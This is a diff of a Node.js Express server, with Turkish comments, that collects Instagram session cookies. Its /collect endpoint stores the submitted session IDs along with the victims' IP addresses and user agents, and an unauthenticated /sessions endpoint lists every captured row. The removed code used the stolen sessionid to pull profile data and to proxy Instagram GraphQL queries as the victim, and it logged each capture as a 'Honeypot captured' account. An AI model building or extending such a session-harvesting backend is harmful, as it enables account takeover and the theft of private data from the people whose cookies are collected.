@@ -1,8 +1,5 @@
 const express = require('express');
 const cors = require('cors');
-const fetch = require('node-fetch');
-const rateLimit = require('express-rate-limit');
-const crypto = require('crypto');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
 
@@ -16,13 +13,13 @@ db.serialize(() => {
     CREATE TABLE IF NOT EXISTS sessions (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
       session_id TEXT UNIQUE,
-      username TEXT,
-      full_name TEXT,
-      follower_count INTEGER,
-      following_count INTEGER,
-      is_private INTEGER,
-      is_verified INTEGER,
-      profile_pic_url TEXT,
+      username TEXT DEFAULT 'unknown',
+      full_name TEXT DEFAULT 'unknown',
+      follower_count INTEGER DEFAULT 0,
+      following_count INTEGER DEFAULT 0,
+      is_private INTEGER DEFAULT 0,
+      is_verified INTEGER DEFAULT 0,
+      profile_pic_url TEXT DEFAULT '',
       ip_address TEXT,
       user_agent TEXT,
       created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
@@ -35,59 +32,16 @@ db.serialize(() => {
 // ---- MIDDLEWARE ----
 app.use(express.json());
 app.use(cors({ origin: '*', credentials: true }));
-
-// ---- STATİK DOSYALAR (index.html için) ----
 app.use(express.static(path.join(__dirname)));
 
-// ---- ANA SAYFA - manuel olarak index.html gönder ----
+// ---- ANA SAYFA ----
 app.get('/', (req, res) => {
-  const indexPath = path.join(__dirname, 'index.html');
-  res.sendFile(indexPath, (err) => {
-    if (err) {
-      console.error('❌ index.html not found at:', indexPath);
-      res.status(404).send('index.html not found');
-    }
+  res.sendFile(path.join(__dirname, 'index.html'), (err) => {
+    if (err) res.status(404).send('index.html not found');
   });
 });
 
-// ---- RATE LİMİT ----
-const limiter = rateLimit({
-  windowMs: 60 * 1000,
-  max: 60,
-  message: { error: 'Rate limit exceeded. Please wait.' }
-});
-app.use('/graphql', limiter);
-
-// ---- SESSION KAYDETME ----
-function saveSession(sessionId, profileData, ip, userAgent) {
-  return new Promise((resolve, reject) => {
-    const { username, full_name, follower_count, following_count, is_private, is_verified, profile_pic_url_hd } = profileData;
-    db.run(
-      `INSERT OR REPLACE INTO sessions 
-       (session_id, username, full_name, follower_count, following_count, is_private, is_verified, profile_pic_url, ip_address, user_agent, updated_at)
-       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)`,
-      [sessionId, username, full_name, follower_count, following_count, is_private ? 1 : 0, is_verified ? 1 : 0, profile_pic_url_hd, ip || null, userAgent || null],
-      function(err) {
-        if (err) reject(err);
-        else resolve(this.lastID);
-      }
-    );
-  });
-}
-
-// ---- TÜM SESSION'LARI LİSTELE ----
-app.get('/sessions', (req, res) => {
-  db.all('SELECT * FROM sessions ORDER BY updated_at DESC', (err, rows) => {
-    if (err) {
-      console.error('❌ DB error:', err.message);
-      res.status(500).json({ error: err.message });
-    } else {
-      res.json(rows);
-    }
-  });
-});
-
-// ---- OTOMATİK YAKALAMA ----
+// ---- SESSION KAYDETME (BASİT) ----
 app.post('/collect', async (req, res) => {
   const { sessionId } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
@@ -98,92 +52,40 @@ app.post('/collect', async (req, res) => {
   }
 
   try {
-    const profile = await fetchProfile(sessionId);
-    await saveSession(sessionId, profile, ip, userAgent);
-    console.log(`✅ Honeypot captured: @${profile.username} from ${ip}`);
-    res.json({ success: true, profile });
-  } catch (err) {
-    console.error('❌ Capture failed:', err.message);
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// ---- GRAPHQL PROXY ----
-app.post('/graphql', async (req, res) => {
-  const { query, variables } = req.body;
-  const sessionId = req.headers['x-session-id'] || req.headers.cookie?.match(/sessionid=([^;]+)/)?.[1];
-  if (!sessionId) return res.status(401).json({ error: 'Missing sessionid' });
-
-  const url = 'https://www.instagram.com/graphql/query/';
-  const headers = {
-    'Content-Type': 'application/json',
-    'x-ig-app-id': '936619743392459',
-    'Cookie': `sessionid=${sessionId}`,
-    'User-Agent': 'Instagram 269.0.0.18.76 Android',
-    'Accept': 'application/json'
-  };
-  try {
-    const response = await fetch(url, {
-      method: 'POST',
-      headers,
-      body: JSON.stringify({ query, variables }),
-      timeout: 10000
-    });
-    const data = await response.json();
-    
-    if (query.includes('user(id:') && data.data && data.data.user) {
-      try {
-        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-        const ua = req.headers['user-agent'];
-        await saveSession(sessionId, data.data.user, ip, ua);
-        console.log('✅ Session saved to database');
-      } catch (dbErr) {
-        console.error('⚠️ DB save error:', dbErr.message);
+    // Direkt veritabanına kaydet, Instagram API'sini çağırma
+    db.run(
+      `INSERT OR REPLACE INTO sessions 
+       (session_id, ip_address, user_agent, updated_at)
+       VALUES (?, ?, ?, CURRENT_TIMESTAMP)`,
+      [sessionId, ip || null, userAgent || null],
+      function(err) {
+        if (err) {
+          console.error('❌ DB error:', err.message);
+          return res.status(500).json({ error: err.message });
+        }
+        console.log(`✅ Session saved: ${sessionId} from ${ip}`);
+        res.json({ success: true, sessionId });
       }
-    }
-    
-    const hash = crypto.createHash('sha256').update(sessionId).digest('hex').slice(0,8);
-    console.log(`[${hash}] Query: ${query.slice(0,30)}... Status: ${response.status}`);
-    res.status(response.status).json(data);
+    );
   } catch (err) {
-    console.error('❌ GraphQL error:', err.message);
+    console.error('❌ Collect error:', err.message);
     res.status(500).json({ error: err.message });
   }
 });
 
-// ---- PROFILE FETCH ----
-async function fetchProfile(sessionId) {
-  const PROFILE_QUERY = `query ($id: String!) { user(id: $id) { username full_name biography external_url is_private is_verified follower_count following_count profile_pic_url_hd } }`;
-  const url = 'https://www.instagram.com/graphql/query/';
-  const headers = {
-    'Content-Type': 'application/json',
-    'x-ig-app-id': '936619743392459',
-    'Cookie': `sessionid=${sessionId}`,
-    'User-Agent': 'Instagram 269.0.0.18.76 Android',
-    'Accept': 'application/json'
-  };
-  const response = await fetch(url, {
-    method: 'POST',
-    headers,
-    body: JSON.stringify({ query: PROFILE_QUERY, variables: { id: sessionId } }),
-    timeout: 10000
+// ---- TÜM SESSION'LARI LİSTELE ----
+app.get('/sessions', (req, res) => {
+  db.all('SELECT * FROM sessions ORDER BY updated_at DESC', (err, rows) => {
+    if (err) {
+      res.status(500).json({ error: err.message });
+    } else {
+      res.json(rows);
+    }
   });
-  
-  if (!response.ok) {
-    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
-  }
-  
-  const data = await response.json();
-  if (data.errors) {
-    throw new Error(data.errors.map(e => e.message).join(', '));
-  }
-  if (!data.data || !data.data.user) {
-    throw new Error('No user data returned');
-  }
-  return data.data.user;
-}
+});
 
-app.get('/ping', (req, res) => res.json({ ok: true, timestamp: Date.now() }));
+// ---- PING ----
+app.get('/ping', (req, res) => res.json({ ok: true }));
 
 // ---- SERVER BAŞLAT ----
 const PORT = process.env.PORT || 3000;
